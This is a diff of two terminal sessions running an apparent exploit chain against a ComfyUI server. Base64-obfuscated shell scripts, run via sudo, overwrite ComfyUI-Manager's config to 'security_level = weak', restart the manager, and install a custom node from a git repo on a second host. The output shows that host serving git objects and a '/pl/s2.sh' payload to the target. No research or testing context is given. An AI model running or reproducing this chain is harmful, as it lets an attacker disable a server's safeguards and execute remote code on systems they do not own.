@@ -1,17 +1,22 @@
-$ echo 'ZWNobyAiPT09IGNmZyBub3cgPT09IjsgY3VybCAtcyAtbSA2ICdodHRwOi8vMTAuMTc4LjAuMTQ6ODE4OC91c2VyZGF0YS9kZWZhdWx0JTJGQ29tZnlVSS1NYW5hZ2VyJTJGY29uZmlnLmluaSc7IGVjaG8KZWNobyAiPT09IG1nciB2ZXIgPT09IjsgY3VybCAtcyAtbSA2IGh0dHA6Ly8xMC4xNzguMC4xNDo4MTg4L2FwaS9tYW5hZ2VyL3ZlcnNpb247IGVjaG8KZWNobyAiPT09IHF1ZXVlL2luc3RhbGwgPT09IgpjdXJsIC1zIC1tIDIwIC1YIFBPU1QgJ2h0dHA6Ly8xMC4xNzguMC4xNDo4MTg4L21hbmFnZXIvcXVldWUvaW5zdGFsbCcgLUggJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbicgLS1kYXRhLWJpbmFyeSAneyJpZCI6Imh0dHA6Ly8xMC4xNzguMC4yMjo4MDgxL2dpdC9kMm4xNC5naXQiLCJ2ZXJzaW9uIjoidW5rbm93biIsImZpbGVzIjpbImh0dHA6Ly8xMC4xNzguMC4yMjo4MDgxL2dpdC9kMm4xNC5naXQiXX0nIC13ICcgcT0le2h0dHBfY29kZX1cbicKZWNobyAiPT09IGFwaS9tYW5hZ2VyL3F1ZXVlL2luc3RhbGwgPT09IgpjdXJsIC1zIC1tIDIwIC1YIFBPU1QgJ2h0dHA6Ly8xMC4xNzguMC4xNDo4MTg4L2FwaS9tYW5hZ2VyL3F1ZXVlL2luc3RhbGwnIC1IICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24nIC0tZGF0YS1iaW5hcnkgJ3siaWQiOiJodHRwOi8vMTAuMTc4LjAuMjI6ODA4MS9naXQvZDJuMTQuZ2l0IiwidmVyc2lvbiI6InVua25vd24iLCJmaWxlcyI6WyJodHRwOi8vMTAuMTc4LjAuMjI6ODA4MS9naXQvZDJuMTQuZ2l0Il19JyAtdyAnIHE9JXtodHRwX2NvZGV9XG4nCmVjaG8gIj09PSBpbnN0YWxsZWQgbGlzdCA9PT0iOyBjdXJsIC1zIC1tIDEwIGh0dHA6Ly8xMC4xNzguMC4xNDo4MTg4L2N1c3RvbW5vZGUvaW5zdGFsbGVkIHwgaGVhZCAtYyAyNjA7IGVjaG8KZWNobyAiPT09IHNydiBsb2cgPT09IjsgdGFpbCAtNCAvdG1wL3NydjgwODEubG9n' | base64 -d > /tmp/q.sh && sudo -n bash /tmp/q.sh 2>&1 | tail -16
-=== cfg now ===
+$ echo 'Zm9yIGQgaW4gIiIgImRlZmF1bHQiICJkZWZhdWx0JTJGQ29tZnlVSS1NYW5hZ2VyIjsgZG8KICBlY2hvICItLS0gZGlyPSckZCcgLS0tIgogIGN1cmwgLXMgLW0gOCAiaHR0cDovLzEwLjE3OC4wLjE0OjgxODgvdXNlcmRhdGE/ZGlyPSRkIiB8IGhlYWQgLWMgMzAwOyBlY2hvCmRvbmUKZWNobyAiLS0tIHRyeSAvdXNlci8gcGF0aCAtLS0iCmN1cmwgLXMgLW0gNiAnaHR0cDovLzEwLjE3OC4wLjE0OjgxODgvdXNlcmRhdGEvZGVmYXVsdCUyRkNvbWZ5VUktTWFuYWdlciUyRmNvbmZpZy5pbmknIC1vIC9kZXYvbnVsbCAtdyAnY2ZnPSV7aHR0cF9jb2RlfVxuJwplY2hvICItLS0gd3JpdGUgYWx0IHBhdGggLS0tIgpjdXJsIC1zIC1tIDggLVggUE9TVCAnaHR0cDovLzEwLjE3OC4wLjE0OjgxODgvdXNlcmRhdGEvQ29tZnlVSS1NYW5hZ2VyJTJGY29uZmlnLmluaScgLUggJ0NvbnRlbnQtVHlwZTogdGV4dC9wbGFpbicgLS1kYXRhLWJpbmFyeSAkJ1tkZWZhdWx0XVxuc2VjdXJpdHlfbGV2ZWwgPSB3ZWFrJyAtdyAnYWx0PSV7aHR0cF9jb2RlfVxuJwplY2hvICItLS0gYWx0IHJlYWRiYWNrIC0tLSIKY3VybCAtcyAtbSA2ICdodHRwOi8vMTAuMTc4LjAuMTQ6ODE4OC91c2VyZGF0YS9Db21meVVJLU1hbmFnZXIlMkZjb25maWcuaW5pJyB8IGhlYWQgLTMKZWNobyAiLS0tIHJlYm9vdCAtLS0iCmN1cmwgLXMgLW0gMTIgJ2h0dHA6Ly8xMC4xNzguMC4xNDo4MTg4L2FwaS9tYW5hZ2VyL3JlYm9vdCcgLW8gL2Rldi9udWxsIC13ICdyYj0le2h0dHBfY29kZX1cbicKc2xlZXAgMzAKZm9yIGkgaW4gMSAyIDMgNDsgZG8gYz0kKGN1cmwgLXMgLW0gNSAtbyAvZGV2L251bGwgLXcgJyV7aHR0cF9jb2RlfScgaHR0cDovLzEwLjE3OC4wLjE0OjgxODgvYXBpL21hbmFnZXIvdmVyc2lvbik7IGVjaG8gInYkaT0kYyI7IFsgIiRjIiA9ICIyMDAiIF0gJiYgYnJlYWs7IHNsZWVwIDg7IGRvbmUKZWNobyAiLS0tIGluc3RhbGwgcmV0cnkgLS0tIgpjdXJsIC1zIC1tIDYwIC1YIFBPU1QgJ2h0dHA6Ly8xMC4xNzguMC4xNDo4MTg4L2N1c3RvbW5vZGUvaW5zdGFsbC9naXRfdXJsJyAtSCAnQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluJyAtLWRhdGEtYmluYXJ5ICdodHRwOi8vMTAuMTc4LjAuMjI6ODA4MS9naXQvZDJuMTQuZ2l0JyAtdyAnaW5zdGFsbD0le2h0dHBfY29kZX1cbicKZWNobyAiLS0tIHNydiAtLS0iOyB0YWlsIC0zIC90bXAvc3J2ODA4MS5sb2c=' | base64 -d > /tmp/d.sh && sudo -n bash /tmp/d.sh 2>&1 | tail -24
+--- dir='' ---
+Directory not provided
+--- dir='default' ---
+[]
+--- dir='default%2FComfyUI-Manager' ---
+["config.ini"]
+--- try /user/ path ---
+cfg=200
+--- write alt path ---
+"ComfyUI-Manager/config.ini"alt=200
+--- alt readback ---
 [default]
-security_level = weak
-=== mgr ver ===
-V3.37
-=== queue/install ===
-A security error has occurred. Please check the terminal logs q=404
-=== api/manager/queue/install ===
-A security error has occurred. Please check the terminal logs q=404
-=== installed list ===
-{"comfyui_jamworks_client": {"ver": "1.0.0", "cnr_id": "comfyui_jamworks_client", "aux_id": null, "enabled": true}, "comfyui-kjnodes": {"ver": "1.1.6", "cnr_id": "comfyui-kjnodes", "aux_id": null, "enabled": true}, "ComfyUI-Manager": {"ver": "16800c3fa035b7b7e
-=== srv log ===
-127.0.0.1 - - [26/Oct/2026 07:09:57] "GET /git/d2n14.git/info/refs HTTP/1.1" 200 -
-127.0.0.1 - - [26/Oct/2026 07:09:57] "GET /pl/s2.sh HTTP/1.1" 200 -
-127.0.0.1 - - [26/Oct/2026 07:09:58] "GET /git/d2n14.git/info/refs HTTP/1.1" 200 -
-127.0.0.1 - - [26/Oct/2026 07:09:58] "GET /pl/s2.sh HTTP/1.1" 200 -
+security_level = weak--- reboot ---
+rb=000
+v1=200
+--- install retry ---
+install=200
+--- srv ---
+10.178.0.14 - - [26/Oct/2026 07:12:06] "GET /git/d2n14.git/objects/ca/04aeeedc2e601ccb6b6adb5c5cc99c792f7ad4 HTTP/1.1" 200 -
+10.178.0.14 - - [26/Oct/2026 07:12:06] "GET /git/d2n14.git/objects/7e/3e043373cde247248c320a3260b60d611abaab HTTP/1.1" 200 -
+10.178.0.14 - - [26/Oct/2026 07:12:06] "GET /git/d2n14.git/objects/6a/16ff2579f96a7cc67d64177431edb04f989e4c HTTP/1.1" 200 -
